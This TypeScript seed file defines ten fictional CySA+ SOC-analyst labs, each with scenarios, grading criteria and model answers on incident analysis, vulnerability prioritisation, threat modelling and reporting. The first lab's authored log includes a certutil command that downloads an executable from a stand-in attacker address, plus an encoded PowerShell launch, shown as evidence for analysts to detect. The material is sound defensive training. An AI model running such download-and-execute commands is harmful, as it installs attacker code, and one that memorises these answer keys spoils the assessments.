import { GENERAL_SAFETY, part, type SeedLabSet } from "./types";
import { source } from "../sources";

// REQ-159: CompTIA CySA+ CS0-004 (V4) -- verifiable SOC-analyst labs beside
// the course's existing self-reported labs.
//
// Aligned to the CS0-004 objectives (Document Version 2.0), four domains:
// Security Operations 34%, Vulnerability Management 26%, Incident Response
// and Management 24%, Reporting and Communication 16%. Exam page read
// 2026-11-07 (CS0-004 launched 2026-06-23; English CS0-003 retires
// 2026-12-22): https://www.comptia.org/en-us/certifications/cybersecurity-analyst/v4/
// Labs are authored against the CS0-004 (current) domains, not the retiring
// CS0-003 units. Density (docs/labs.md, policy "hybrid"): 3 / 3 / 2 / 2 = 10.
//
// Standards and references cited (checked against the publisher 2026-11-07):
//   - CVSS v4.0 (FIRST), scores computed with FIRST's reference calculator;
//     EPSS = probability of exploitation in the wild in 30 days; CISA KEV =
//     evidence of active exploitation (BOD 22-01).
//     https://www.first.org/cvss/v4.0/specification-document
//     https://www.first.org/epss/  https://www.cisa.gov/known-exploited-vulnerabilities
//   - MITRE ATT&CK Enterprise v20 technique IDs; Pyramid of Pain (David
//     Bianco); STRIDE (Microsoft); Cyber Kill Chain (Lockheed Martin);
//     Diamond Model.
//   - Windows Security event IDs per Microsoft Learn (4624/4625 logon,
//     4688 process creation, 4698 scheduled task, 1102 log cleared).
//
// Fictional organisations; IPs from documentation ranges (192.0.2.0/24,
// 198.51.100.0/24, 203.0.113.0/24) and RFC 1918; hostnames/domains use
// .example. Log excerpts are authored, not from any real system. Every lab
// is needs_expert_review.

export const CYSAPLUS_LABS: SeedLabSet = {
  trackCode: "CYSAPLUS",
  sources: [
    source("https://www.comptia.org/en-us/certifications/cybersecurity-analyst/v4/", "exam_outline", "2026-11-07"),
    source("https://www.first.org/cvss/v4.0/specification-document", "reference", "2026-11-07"),
    source("https://www.first.org/epss/", "reference", "2026-11-07"),
    source("https://www.cisa.gov/known-exploited-vulnerabilities", "reference", "2026-11-07"),
    source("https://attack.mitre.org/", "reference", "2026-11-07"),
  ],
  labs: [
    // ----- Domain 1: Security Operations (3)
    {
      slug: "host-indicators-lolbin",
      objective:
        "Given a scenario, analyze host-related indicators: resource consumption, unauthorized software, unauthorized configuration, and anomalous activity -- suspicious or rogue processes, Living Off the Land Binaries (LOLBins) and Scripts, file system changes, data exfiltration",
      kind: "case",
      title: "Analyze host indicators on a suspect workstation",
      brief:
        "You are a SOC analyst at Meridian Health (fictional). EDR flagged workstation WS-114. You review authored process-creation records (Windows event 4688) from the host. All timestamps UTC.\n\n09:02 WINWORD.EXE (user: r.santos) opened Invoice_Q3.docm\n09:02 WINWORD.EXE -> cmd.exe -> powershell.exe -enc <base64>\n09:03 powershell.exe -> certutil.exe -urlcache -split -f http://203.0.113.60/a.txt a.exe\n09:03 a.exe (new, unsigned, in C:\\Users\\r.santos\\AppData\\Local\\Temp)\n09:05 a.exe -> rundll32.exe\n09:11 a.exe network: 1.2 GB outbound to 203.0.113.60 over 443",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "The records above are your starting evidence.",
          ask: "Name the suspicious indicators and what the chain shows.",
          parts: [
            part(
              "Office-spawned shell and LOLBins",
              "Flags Word spawning cmd/PowerShell as anomalous (macro execution), and names certutil and rundll32 as living-off-the-land binaries abused to download and run code; may cite ATT&CK T1059.001, T1218.011.",
              "WINWORD.EXE spawning cmd.exe then an encoded PowerShell command is the macro-execution red flag -- Office apps do not normally launch shells (T1059.001). certutil.exe used with -urlcache to fetch a file and rundll32.exe executing it are living-off-the-land binaries (LOLBins) abused to download and run code (T1105, T1218.011)."
            ),
            part(
              "Dropped binary and exfiltration",
              "Identifies the new unsigned executable in a Temp path as unauthorized software, and the 1.2 GB outbound transfer as likely data exfiltration to the same address that served the download.",
              "a.exe is an unsigned new binary in a user Temp folder -- unauthorized software, a classic dropper location. The 1.2 GB outbound to 203.0.113.60 (the same host that served a.exe) is almost certainly data exfiltration (T1041/T1048). The download server and the exfil server being identical ties the activity together."
            ),
          ],
        },
        {
          text: "You confirm the host is compromised. The same external address, 203.0.113.60, and the hash of a.exe may appear elsewhere.",
          ask: "What do you contain, and what indicators do you pivot on across the fleet?",
          parts: [
            part(
              "Containment",
              "Isolates WS-114 (EDR network-contain) and preserves evidence (memory/disk) before cleanup; disables or watches the user account used.",
              "Network-isolate WS-114 through the EDR so exfiltration stops but the host stays up for forensics; preserve volatile data and the a.exe sample before reimaging. Review r.santos's account for misuse."
            ),
            part(
              "Pivot indicators",
              "Names the atomic IOCs to hunt across the fleet: the external IP 203.0.113.60, the a.exe file hash, and the certutil/encoded-PowerShell behavior, and checks other hosts for the same.",
              "Hunt the fleet for: connections to 203.0.113.60, the SHA-256 of a.exe, and the behavioral pattern of Office spawning encoded PowerShell or certutil downloading executables. The IP and hash are quick atomic checks; the behavior catches variants that changed the file or server."
            ),
          ],
        },
      ],
    },
    {
      slug: "pyramid-of-pain-iocs",
      objective:
        "Threat actors -- advanced persistent threat (APT), insider threat -- and tactics, techniques, and procedures (TTPs): heat maps, Pyramid of Pain, MITRE ATT&CK, attribution",
      kind: "build",
      title: "Rank detections by the Pyramid of Pain",
      brief:
        "After the WS-114 incident (fictional), your team has a mix of indicators to turn into detections: (a) the file hash of the dropper, (b) the attacker's IP address 203.0.113.60, (c) the download domain used, (d) the behavior of Office applications spawning encoded PowerShell and certutil downloading executables. Leadership asks which detections are most durable against a returning attacker, using David Bianco's Pyramid of Pain.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Place the indicators on the Pyramid of Pain and recommend where to invest.",
          parts: [
            part(
              "Order on the pyramid",
              "Orders the indicators from easiest-for-the-attacker-to-change (hash, IP, domain) up to hardest (TTPs/behaviour), matching the Pyramid of Pain levels.",
              "Bottom (trivial to change): the file hash, then the IP address, then the domain. Top (hard to change): the TTP/behaviour -- Office spawning encoded PowerShell and certutil downloading executables. The Pyramid ranks how much pain a detection causes the attacker if you deny it."
            ),
            part(
              "Why behavior hurts most",
              "Explains that a hash changes with one recompile, an IP or domain is cheap to rotate, but changing the underlying technique forces the attacker to re-tool -- so behavioral detections are the most durable.",
              "A new build changes the hash instantly; IPs and domains are cheap to swap. To defeat a behavioral detection the attacker must change how they operate (stop using certutil/encoded PowerShell), which is expensive and may break their tooling. That is why TTP-level detections cause the most 'pain'."
            ),
            part(
              "Balanced investment",
              "Recommends keeping the cheap atomic indicators (fast blocks now) while investing in behavioural/ATT&CK-based detections for durability -- not either/or.",
              "Keep the hash, IP and domain as quick blocklist entries -- they stop this exact campaign today at near-zero cost. But invest the detection-engineering effort in the behavior (an ATT&CK-mapped rule for Office-spawned encoded PowerShell and LOLBin downloads), because that still fires when the attacker rotates infrastructure."
            ),
            part(
              "Attribution caution",
              "Notes that indicators support but do not prove attribution, and that acting on detection does not require naming the actor.",
              "Shared infrastructure or tooling can suggest an actor, but IPs and tools are reused and planted, so treat attribution as low-confidence unless corroborated. Detection and response do not need a confirmed actor name -- defend on the behavior regardless."
            ),
          ],
        },
      ],
    },
    {
      slug: "stride-threat-model-api",
      objective:
        "Threat modeling with STRIDE (spoofing, tampering, repudiation, information disclosure, denial of service, elevation of privilege), threat mapping, and cyber deception",
      kind: "build",
      title: "Threat-model a customer API with STRIDE",
      brief:
        "Crestline Bank (fictional) is launching a REST API: a mobile app authenticates with a token and calls endpoints to view balances and move money between the user's own accounts. Traffic is over the internet to a load balancer, then to app servers and a database. You must run a STRIDE threat model and name one concrete threat and mitigation per category.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Give one threat and one mitigation for each STRIDE category.",
          parts: [
            part(
              "Spoofing and Tampering",
              "Gives a Spoofing threat (impersonating a user/token) with a mitigation (strong token auth, TLS, token binding) and a Tampering threat (altering a request/amount) with integrity controls (TLS, server-side validation, signed requests).",
              "Spoofing: an attacker replays or forges a token to act as another user -- mitigate with short-lived, validated tokens over TLS and token binding/MFA. Tampering: a request's amount or destination account is altered in transit or by the client -- mitigate with TLS and server-side validation that the source account belongs to the authenticated user (never trust the client)."
            ),
            part(
              "Repudiation and Information Disclosure",
              "Gives a Repudiation threat (user denies a transfer) with mitigation (tamper-evident audit logging) and an Information Disclosure threat (exposing balances/PII) with mitigation (TLS, authorization checks, least data returned).",
              "Repudiation: a user disputes a money transfer -- mitigate with complete, tamper-evident audit logs tying each action to an authenticated identity and time. Information Disclosure: balances or account data leak via a broken authorization check (one user reads another's account) -- mitigate with per-request authorization, TLS, and returning only the data the user owns."
            ),
            part(
              "Denial of Service and Elevation of Privilege",
              "Gives a DoS threat (flooding the API) with mitigation (rate limiting, WAF, autoscaling) and an Elevation threat (a normal user reaching admin/other-account functions) with mitigation (server-side authorization, least privilege).",
              "Denial of Service: request floods exhaust the API -- mitigate with rate limiting per token/IP, a WAF and autoscaling. Elevation of Privilege: a standard user invokes an admin endpoint or moves money from an account they do not own -- mitigate with strict server-side authorization on every endpoint and least-privilege roles."
            ),
            part(
              "Deception as an addition",
              "Adds a cyber-deception idea (honeytoken/canary) that detects abuse early, noting it complements rather than replaces the STRIDE mitigations.",
              "Add deception: a honeytoken account or a canary API key that no legitimate client uses, alerting the moment it is touched. It gives early warning of probing but complements, not replaces, the STRIDE controls above."
            ),
          ],
        },
      ],
    },
    // ----- Domain 2: Vulnerability Management (3)
    {
      slug: "cvss-epss-kev-prioritization",
      objective:
        "Scoring methods -- Common Vulnerability Scoring System (CVSS) metrics and FIRST's Exploit Prediction Scoring System (EPSS) -- and context awareness: internal, external, isolated",
      kind: "build",
      title: "Prioritize remediation with CVSS, EPSS and context",
      brief:
        "You own vulnerability management at Alder Grove Systems (fictional). This cycle has four findings; the window is tight. Use CVSS severity, EPSS, KEV and asset context -- not CVSS alone.\n\n(1) Internet-facing email gateway: pre-auth RCE. CVSS v4.0 9.3 Critical. EPSS 0.91 (99.8th pct). In CISA KEV.\n(2) Internal, isolated lab segment server (no route to production or internet): RCE. CVSS v4.0 9.3 Critical. EPSS 0.02. Not in KEV.\n(3) External customer portal: authenticated privilege escalation. CVSS v4.0 8.7 High. EPSS 0.15. Not in KEV.\n(4) Internet-facing marketing site: reflected XSS. CVSS v4.0 6.9 Medium. EPSS 0.55 (99.0th pct). Not in KEV.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Rank the four, justify with each scoring input, and explain context awareness.",
          parts: [
            part(
              "Ranking",
              "Ranks finding 1 first; places the isolated same-CVSS finding 2 well down despite its 9.3; produces a defensible full order (1, then 3 or 4, then 2).",
              "Order: 1 first (critical, actively exploited, internet-facing). Then 3 and 4 (external exposure, real or elevated likelihood). Finding 2 last despite its 9.3, because it is isolated. A reasonable order: 1, 3, 4, 2, with justification -- but 1 first and 2 near-last are the key calls."
            ),
            part(
              "What each input means",
              "Defines CVSS (severity if exploited), EPSS (probability of exploitation in the wild in 30 days), and KEV (confirmed active exploitation), and uses them together to justify finding 1 over the equally-scored finding 2.",
              "CVSS says how bad exploitation is; EPSS estimates the 30-day probability it is exploited in the wild; KEV means CISA has evidence it is already being exploited. Findings 1 and 2 share CVSS 9.3, but 1 is in KEV with EPSS 0.91 and internet-facing, while 2 has EPSS 0.02 and is isolated -- so 1 is urgent and 2 is not, on identical severity."
            ),
            part(
              "Context awareness",
              "Applies internal/external/isolated context: an isolated no-route asset is low urgency even at 9.3; internet-facing raises urgency; notes finding 4's lower severity but higher EPSS and external exposure keep it above the isolated critical.",
              "Context flips the raw scores: finding 2 is critical but isolated (no route from the internet or production), so an attacker cannot reach it -- low real risk. Findings 1, 3 and 4 are reachable from outside; finding 4 is only Medium but has a real exploitation signal (EPSS 0.55) and is internet-facing, so it still outranks the unreachable 9.3."
            ),
            part(
              "Plan for the rest",
              "Gives the deferred items dated SLAs and compensating controls (for example WAF for the XSS, and simply confirming finding 2's isolation and scheduling it) rather than ignoring them.",
              "Patch 1 in the window; schedule 3 and 4 within their severity SLAs, with a WAF rule or input filtering for the XSS meanwhile; verify finding 2's isolation is real and patch it on the normal cycle. Document the decisions so the deferrals are deliberate, and re-check EPSS/KEV, which change daily."
            ),
          ],
        },
      ],
    },
    {
      slug: "triage-scanner-output",
      objective:
        "Given tool output, analyze web application scanners (Burp Suite, Zed Attack Proxy (ZAP), Nikto) and vulnerability scanners (Nessus, Nuclei, Open Vulnerability Assessment Scanner (OpenVAS))",
      kind: "build",
      title: "Triage vulnerability-scanner findings as true or false positives",
      brief:
        "A credentialed Nessus scan and an OWASP ZAP baseline scan of Birchwood Retail's (fictional) staging environment produced four alerts. You must decide which are true positives worth action and which are likely false positives, and what evidence settles each.\n\n(A) Nessus: 'TLS 1.0 enabled' on the load balancer.\n(B) ZAP: 'SQL Injection' on /search?q= (reported from an error string in the response).\n(C) Nessus: 'Apache 2.4.49 path traversal (CVE-2021-41773)' on a host that the banner says runs 2.4.62.\n(D) ZAP: 'Missing Content-Security-Policy header' on the login page.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "For each alert, call it true or false positive (or needs validation) and name the evidence.",
          parts: [
            part(
              "Protocol and header findings",
              "Treats (A) TLS 1.0 as a true positive (configuration fact, verifiable) and (D) missing CSP as a true (if lower-severity) finding, both confirmable without exploitation.",
              "(A) TLS 1.0 enabled: true positive -- a configuration fact, confirm with openssl s_client or testssl and disable the protocol. (D) Missing CSP header: true positive but lower severity -- confirm by reading the response headers; add a Content-Security-Policy. Both are verifiable without exploiting anything."
            ),
            part(
              "The version mismatch",
              "Identifies (C) as a likely false positive because CVE-2021-41773 affects only 2.4.49 (its incomplete fix in 2.4.50 is the separate CVE-2021-42013, fixed in 2.4.51) and the host banner reports 2.4.62 (patched), and says to confirm the real version (banners can mislead).",
              "(C) CVE-2021-41773 affects Apache 2.4.49 only; the incomplete fix in 2.4.50 is tracked as CVE-2021-42013, fixed in 2.4.51. The host reports 2.4.62, which is patched, so this is a likely false positive from a signature keyed on the product not the exact version. Confirm the actual version (the banner could be wrong or back-ported) before dismissing, but do not spend the window patching an already-fixed flaw."
            ),
            part(
              "The injection alert",
              "Treats (B) SQLi as needs-validation/potential true positive -- an error-string match can be a false positive, so validate safely in staging (authorized, non-destructive) before escalating.",
              "(B) SQL injection: do not accept or dismiss on an error string alone -- that is a common false-positive source. Validate it safely in the authorized staging environment (a benign, non-destructive test, with permission and change control), or review the code/parameterised-query use. If confirmed it is high severity; if it is just a reflected error message, it is a false positive."
            ),
            part(
              "Why validation matters",
              "Explains that scanners flag possibilities, so confirming true vs false positives prevents wasted effort and missed real risk, and that credentialed scans and manual validation reduce both false positives and negatives.",
              "Scanners report possibilities, not confirmed exploits; triaging true from false positives keeps the team from patching non-issues and from ignoring real ones. Credentialed scans (which read actual versions/config) cut false positives, and manual validation of the high-impact alerts catches both false positives and false negatives."
            ),
          ],
        },
      ],
    },
    {
      slug: "sbom-supply-chain-triage",
      objective: "Third-party risk: supply chain, software composition analysis (SCA), software bill of materials (SBOM)",
      kind: "build",
      title: "Use an SBOM to respond to a dependency vulnerability",
      brief:
        "A critical vulnerability is announced in a widely used logging library. Nimbus Apps (fictional) ships twelve services. The security team asks: are we affected, and how fast can we tell? Today there is no software bill of materials (SBOM) and no software composition analysis (SCA); engineers are grepping repos by hand. You must specify how SBOM and SCA answer this and the response.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Explain how SBOM/SCA answer 'are we affected' and the remediation.",
          parts: [
            part(
              "What an SBOM gives you",
              "Explains an SBOM is an inventory of components and versions per build, so you can query which services include the vulnerable library and version, in minutes instead of manual grepping.",
              "An SBOM lists every component and version in each build. With one per service, answering 'which of the twelve include the vulnerable library at an affected version' is a query, not a manual repo hunt -- so you know your exposure in minutes, including transitive (indirect) dependencies that grep misses."
            ),
            part(
              "SCA and transitive dependencies",
              "Notes SCA tools generate/scan SBOMs and flag known-vulnerable components including transitive ones, and that the library may be pulled in indirectly.",
              "Software composition analysis tools generate SBOMs and continuously match components against vulnerability databases, catching the library even when it is a transitive dependency of another package -- which is exactly what a hand grep of top-level manifests would miss."
            ),
            part(
              "Remediation and verification",
              "Gives the response: update affected services to a fixed version (or apply the vendor mitigation), prioritize internet-facing ones, and verify the fix; compensating controls where immediate patching is blocked.",
              "Upgrade the affected services to a patched library version, prioritizing internet-facing and sensitive ones; where an immediate upgrade is blocked, apply the published mitigation or a compensating control (e.g. WAF/network restriction). Then verify each fix -- re-scan the SBOM to confirm the vulnerable version is gone."
            ),
            part(
              "Making it repeatable",
              "Recommends generating SBOMs in the build pipeline and running SCA continuously so the next disclosure is answered automatically, not by hand.",
              "Build SBOM generation and SCA into the CI/CD pipeline so every release has a current component inventory and new disclosures are matched automatically. The goal is that the next 'are we affected?' is answered by a dashboard, not an all-hands grep."
            ),
          ],
        },
      ],
    },
    // ----- Domain 3: Incident Response and Management (2)
    {
      slug: "build-incident-timeline",
      objective: "Given a scenario, assess: triage, establishment of a timeline, determining severity and impact, prioritization, escalation",
      kind: "case",
      title: "Build a timeline and assess severity from logs",
      brief:
        "You are triaging an alert at Foxglove Retail (fictional). You have authored log fragments from three sources (all UTC) about host APPSRV-02 and user svc_deploy.\n\nWindows Security (APPSRV-02):\n  01:12 4625 svc_deploy logon type 3 from 198.51.100.23 (status: wrong password)  x40 over 6 min\n  01:19 4624 svc_deploy logon type 3 from 198.51.100.23 (success)\n  01:21 4688 new process: powershell.exe (parent: services.exe)\n  01:24 4698 scheduled task 'Updater' created\nFirewall:\n  01:40 APPSRV-02 -> 198.51.100.23 outbound 443, 300 MB\nSIEM correlation:\n  01:41 alert 'large outbound transfer from server segment'",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "The fragments above are what triage has so far.",
          ask: "Build the timeline and state what each stage shows.",
          parts: [
            part(
              "Ordered timeline",
              "Produces a UTC timeline: failed logons (spray/brute on one account), then success, process spawn, scheduled task (persistence), then large outbound transfer.",
              "01:12-01:18 repeated failed network logons for svc_deploy from 198.51.100.23 (credential guessing). 01:19 successful logon from the same IP. 01:21 PowerShell spawned by services.exe (anomalous). 01:24 a scheduled task 'Updater' created (persistence). 01:40 300 MB outbound to the same IP (exfiltration). 01:41 SIEM alert."
            ),
            part(
              "What the stages mean",
              "Interprets the stages: initial access via credential attack on a service account, execution, persistence (scheduled task), exfiltration; notes the same external IP ties them together.",
              "This is initial access by guessing a service-account password (T1110), successful valid-account logon (T1078), execution via PowerShell, persistence via a scheduled task (T1053.005), and data exfiltration -- all involving 198.51.100.23, which links the attacker's source and exfil destination."
            ),
          ],
        },
        {
          text: "Triage is done; you must assign severity and decide escalation. APPSRV-02 is a production application server that holds customer order data.",
          ask: "Determine severity/impact and the escalation.",
          parts: [
            part(
              "Severity and impact",
              "Rates this high/critical: confirmed compromise with persistence and ~300 MB exfiltration from a production server holding customer data; states the impact in terms of confirmed data loss and foothold.",
              "High-to-critical severity: not a probe but a confirmed compromise -- valid-account access, persistence, and ~300 MB exfiltrated from a production server holding customer order data. Impact is likely data loss of customer records plus an attacker foothold on production."
            ),
            part(
              "Escalation",
              "Escalates per an IR plan: notify the incident lead/management, involve data-owner and legal/privacy given probable customer-data exposure, and move to containment; states who is notified and why.",
              "Escalate to the incident commander and management immediately given a production compromise with likely customer-data loss, engage legal/privacy (possible breach-notification duties) and the data owner, and trigger containment (isolate APPSRV-02, disable svc_deploy, block 198.51.100.23). A high-severity confirmed exfiltration is not something a single analyst closes alone."
            ),
          ],
        },
      ],
    },
    {
      slug: "contain-and-recover-steps",
      objective:
        "Given a scenario, contain and recover: isolating affected targets, remediation and verification, release from isolation, performing restoration",
      kind: "build",
      title: "Plan containment, recovery and release from isolation",
      brief:
        "Following the APPSRV-02 compromise (fictional), the incident commander asks you for the containment-through-recovery plan: how to isolate, remediate and verify, when the host may rejoin the network, and how to restore service. APPSRV-02 is one of three load-balanced application servers; the other two show no indicators so far.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Write the containment, remediation/verification, release and restoration plan.",
          parts: [
            part(
              "Isolation preserving evidence",
              "Isolates APPSRV-02 (network-contain or pull from the load-balancer pool) while preserving volatile and disk evidence before any wipe, and checks the other two servers for the same indicators.",
              "Remove APPSRV-02 from the load-balancer pool and network-isolate it so exfiltration stops and users shift to the healthy servers, but capture memory and a disk image before reimaging. In parallel, hunt APPSRV-01/03 for the same IOCs (198.51.100.23, the 'Updater' task, anomalous PowerShell)."
            ),
            part(
              "Remediation and verification",
              "Remediates by removing persistence and the attacker's access (reimage rather than clean, rotate the svc_deploy credential and any secrets it held), then verifies the host is clean before trusting it.",
              "Reimage APPSRV-02 from a known-good build rather than deleting artifacts (persistence may hide); rotate the svc_deploy password and any credentials/keys that were on the host, and close the entry point (disable weak service-account auth, restrict RDP/SMB as relevant). Verify: scan the rebuilt host and confirm no indicators remain before it is trusted."
            ),
            part(
              "Release from isolation",
              "States explicit release criteria: the host is rebuilt and verified clean, root cause/entry point is closed, and monitoring is in place, before it rejoins the pool.",
              "Release criteria before APPSRV-02 rejoins the load balancer: rebuilt from a trusted image, verified free of indicators, the entry point (the guessable service account) fixed, and heightened monitoring on it. Returning a host too early just re-exposes it."
            ),
            part(
              "Restoration",
              "Restores service/data from known-good backups if any data was altered, checking backup integrity, and returns to normal operation in a controlled way.",
              "Restore any affected data from backups taken before the compromise, checking the backups for integrity/indicators first; bring APPSRV-02 back into the pool gradually and confirm normal operation. Document that service is restored and the incident can move to post-incident review."
            ),
          ],
        },
      ],
    },
    // ----- Domain 4: Reporting and Communication (2)
    {
      slug: "exec-summary-and-handover",
      objective: "Incident declaration and escalation, executive summary, and shift/incident handover",
      kind: "build",
      title: "Write the executive summary and shift handover for an incident",
      brief:
        "The APPSRV-02 incident (fictional) is mid-response at the end of your SOC shift. Containment is done; eradication and recovery are in progress. You must write (1) a short executive summary for non-technical leadership and (2) a shift handover for the incoming analyst, from the same facts: a production app server was compromised via a guessed service-account password, about 300 MB of data was exfiltrated, the host is isolated and being rebuilt, and the other two servers appear clean.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Write both the executive summary and the handover; they serve different readers.",
          parts: [
            part(
              "Executive summary content",
              "Writes a brief, jargon-free summary stating impact (what happened, data exposure, business effect), current status (contained), and the decision/support needed -- not technical detail.",
              "Executive summary: 'On [date] an attacker gained access to one production application server by guessing a service account's password and copied roughly 300 MB of data, likely including customer order records. The server is isolated and being rebuilt; service continues on the other servers. We are assessing whether customer-notification obligations apply and request a decision on external communications.' Impact, status, decision needed -- no event IDs."
            ),
            part(
              "No jargon, states the risk",
              "Keeps the executive version free of ATT&CK IDs/log detail but does not understate the risk (names probable customer-data exposure).",
              "The executive version omits technical indicators but must not soften the real risk: say plainly that customer data was likely taken and notification may be required. Leaders make the business and legal calls, so they need the honest impact, not reassurance."
            ),
            part(
              "Handover content",
              "Writes a technical handover: what is known, what is contained, what is pending, open tasks with owners, and the IOCs -- so the next analyst can continue without re-investigating.",
              "Handover: known -- compromise of APPSRV-02 via svc_deploy credential guessing from 198.51.100.23, ~300 MB exfiltrated, scheduled task 'Updater' persistence. Contained -- APPSRV-02 isolated, svc_deploy disabled, IP blocked. Pending -- reimage and verification of APPSRV-02, confirm APPSRV-01/03 clean, rotate related secrets, preserve evidence for legal. IOCs listed. Owner per task."
            ),
            part(
              "Why two documents",
              "Explains the two readers need different things: leadership needs impact and decisions, the next analyst needs technical continuity; one document cannot serve both well.",
              "The two serve different audiences: leadership needs impact, status and the decision they must make; the incoming analyst needs technical state and open tasks so nothing is dropped across the shift. Collapsing them either buries the decision in jargon or strips the detail the next analyst needs."
            ),
          ],
        },
      ],
    },
    {
      slug: "soc-metrics-kpis",
      objective:
        "SOC metrics and KPIs: alert volume, false-positive rate, true-positive rate, mean time to close, mean time to detect, mean time to respond, mean time to remediate, phishing campaign click rate",
      kind: "build",
      title: "Compute SOC metrics and decide what to improve",
      brief:
        "A month of SOC data at Sable Industries (fictional): 2,000 alerts; 1,700 closed as false positives; 300 true positives. For the true positives, the average time from the activity occurring to detection was 36 hours, from detection to a responder acting 30 minutes, and from detection to full remediation 5 days. A phishing simulation to 500 staff got 90 clicks. You must compute the key metrics and say which to work on first.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Compute the metrics and recommend a priority.",
          parts: [
            part(
              "False/true positive rates",
              "Computes false-positive rate = 1,700/2,000 = 85% and true-positive rate = 300/2,000 = 15% and notes the analyst burden that implies.",
              "False-positive rate = 1,700 / 2,000 = 85%; true-positive rate = 300 / 2,000 = 15%. Analysts spend most of their effort closing noise, which is a tuning problem and a burnout/missed-alert risk."
            ),
            part(
              "Time metrics",
              "States MTTD ≈ 36 hours, MTTR (respond) ≈ 30 minutes, mean time to remediate ≈ 5 days, and reads them: detection is slow, response is fast once detected, remediation is slow.",
              "Mean time to detect ≈ 36 hours; mean time to respond (detection to action) ≈ 30 minutes; mean time to remediate ≈ 5 days. Reading them: once something is detected the team reacts quickly, but it takes a day and a half to notice and five days to fully fix."
            ),
            part(
              "Phishing click rate",
              "Computes the phishing click rate = 90/500 = 18% and notes it as a human-risk indicator to drive training.",
              "Phishing click rate = 90 / 500 = 18%. That is a high susceptibility and a candidate for targeted awareness training, measured by whether the rate falls in later simulations."
            ),
            part(
              "Priority and justification",
              "Recommends a defensible priority -- most reasonably the 36-hour MTTD (an attacker has a long head start) and/or the 85% false-positive rate that likely causes slow detection -- tying the choice to risk.",
              "Priority: cut the 36-hour mean time to detect -- an attacker with a day and a half before anyone notices can do real damage, and the fast response time is wasted if detection is slow. The 85% false-positive rate is likely a cause (analysts buried in noise miss real alerts), so alert tuning serves both. The 18% click rate is a parallel training effort. Response time is already good and needs no work."
            ),
          ],
        },
      ],
    },
  ],
};
